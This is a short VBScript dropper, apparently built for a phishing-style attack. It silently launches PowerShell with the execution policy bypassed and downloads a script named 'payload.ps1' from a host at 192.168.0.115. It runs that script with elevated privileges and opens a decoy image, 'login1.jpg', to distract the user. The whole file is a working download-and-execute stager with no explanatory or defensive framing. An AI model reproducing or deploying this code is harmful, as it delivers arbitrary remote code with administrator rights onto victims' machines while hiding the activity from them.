Set objShell = CreateObject("Wscript.Shell")

objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""$dl=$env:USERPROFILE+'\Downloads'; Invoke-WebRequest -Uri 'http://192.168.0.115:8000/test.ps1' -OutFile ($dl+'\payload.ps1'); Invoke-WebRequest -Uri 'http://192.168.0.115:8000/login1.jpg' -OutFile ($dl+'\login1.jpg'); Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass','-File',($dl+'\payload.ps1') -Verb RunAs; Start-Sleep -Seconds 3; Start-Process ($dl+'\login1.jpg')""", 0, False
